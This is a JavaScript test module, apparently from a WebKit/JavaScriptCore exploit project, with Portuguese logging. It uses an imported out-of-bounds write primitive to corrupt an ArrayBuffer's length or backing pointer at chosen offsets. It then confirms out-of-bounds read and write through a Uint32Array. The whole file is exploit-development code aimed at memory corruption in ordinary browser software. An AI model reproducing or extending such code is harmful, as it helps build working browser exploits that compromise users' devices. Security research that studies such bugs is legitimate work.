// js/script3/testCorruptArrayBufferAggressively.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

async function attempt_aggressive_corruption(test_name, offset_to_corrupt, value_to_write, bytes_to_write, is_size_corruption) {
    const FNAME_TEST = `attempt_aggressive_corruption<${test_name}>`;
    logS3(`--- Iniciando Teste Agressivo: ${test_name} ---`, "test", FNAME_TEST);
    logS3(`    Alvo Offset: ${toHex(offset_to_corrupt)}, Valor: ${typeof value_to_write === 'object' ? value_to_write.toString(true) : toHex(value_to_write)}, Bytes: ${bytes_to_write}`, "info", FNAME_TEST);
    document.title = `AggroCorrupt: ${test_name}`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO OOB Setup";
        return;
    }

    const initial_byte_length = oob_array_buffer_real.byteLength;
    logS3(`oob_array_buffer_real inicial: tamanho=${initial_byte_length} bytes`, "info", FNAME_TEST);

    // Realizar a corrupção
    try {
        logS3(`CORRUPÇÃO OOB: Escrevendo em ${toHex(offset_to_corrupt)}...`, "warn", FNAME_TEST);
        oob_write_absolute(offset_to_corrupt, value_to_write, bytes_to_write);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`ERRO na escrita OOB: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    // Verificação Agressiva Pós-Corrupção
    logS3("Verificando efeitos da corrupção...", "info", FNAME_TEST);
    let u32_array;
    let new_length_property = oob_array_buffer_real.byteLength;
    logS3(`   oob_array_buffer_real.byteLength (propriedade JS) APÓS corrupção: ${new_length_property}`, "leak", FNAME_TEST);

    try {
        logS3("   Tentando criar new Uint32Array(oob_array_buffer_real)...", "info", FNAME_TEST);
        u32_array = new Uint32Array(oob_array_buffer_real);
        logS3(`   Uint32Array criado. Comprimento (u32_array.length): ${u32_array.length} (Equivalente a ${u32_array.length * 4} bytes)`, "leak", FNAME_TEST);
        document.title = `AggroCorrupt: U32Array OK len ${u32_array.length}`;

        if (is_size_corruption) {
            logS3("   Teste de Corrupção de TAMANHO:", "info", FNAME_TEST);
            if (u32_array.length * 4 > initial_byte_length) {
                logS3(`    !!! SUCESSO ESPECULATIVO: Tamanho percebido pelo Uint32Array (${u32_array.length * 4}b) > original (${initial_byte_length}b) !!!`, "vuln", FNAME_TEST);
                const oob_idx = (initial_byte_length / 4); // Primeiro índice além do original
                logS3(`    Tentando ler u32_array[${toHex(oob_idx)}] (além do limite original)...`, "warn", FNAME_TEST);
                let val = u32_array[oob_idx];
                logS3(`    Valor lido de u32_array[${toHex(oob_idx)}]: ${toHex(val)}`, "leak", FNAME_TEST);
                document.title = `AggroCorrupt: Size R OK ${toHex(val)}`;

                logS3(`    Tentando escrever 0xDEADBEEF em u32_array[${toHex(oob_idx)}]...`, "warn", FNAME_TEST);
                u32_array[oob_idx] = 0xDEADBEEF;
                if (u32_array[oob_idx] === 0xDEADBEEF) {
                    logS3(`    !!! ESCRITA/LEITURA OOB NO Uint32Array CONFIRMADA @idx ${toHex(oob_idx)} !!!`, "critical", FNAME_TEST);
                    document.title = `AggroCorrupt: Size R/W OK!`;
                } else {
                    logS3(`    Falha na verificação da escrita OOB no Uint32Array.`, "error", FNAME_TEST);
                }
            } else {
                logS3(`    Tamanho percebido pelo Uint32Array (${u32_array.length*4}b) não foi inflado.`, "info", FNAME_TEST);
            }
        } else { // Teste de Corrupção de PONTEIRO
            logS3("   Teste de Corrupção de PONTEIRO:", "info", FNAME_TEST);
            logS3("   Tentando ler u32_array[0]...", "warn", FNAME_TEST);
            let val = u32_array[0];
            logS3(`    Valor lido de u32_array[0]: ${toHex(val)}`, "leak", FNAME_TEST);
            if (value_to_write instanceof AdvancedInt64 && value_to_write.low() === 0 && value_to_write.high() === 0) {
                if (val === 0) { // Esperado se o ponteiro nulo ler de uma região zerada (ou a leitura falhar graciosamente para 0)
                    logS3("      Leitura de 0 após anular ponteiro (pode ser fallback, não necessariamente sucesso).", "warn", FNAME_TEST);
                } else {
                     logS3("      Leitura INESPERADA após anular ponteiro.", "vuln", FNAME_TEST);
                }
            }
            document.title = `AggroCorrupt: Ptr Read OK ${toHex(val)}`;
        }

    } catch (e) {
        logS3(`   ERRO CRÍTICO ao criar ou usar Uint32Array: ${e.name} - ${e.message}`, "error", FNAME_TEST);
        document.title = `AggroCorrupt: U32Array ERRO ${e.name}`;
        console.error("Erro com Uint32Array:", e);
    }

    logS3(`--- Teste Agressivo Concluído: ${test_name} ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
}
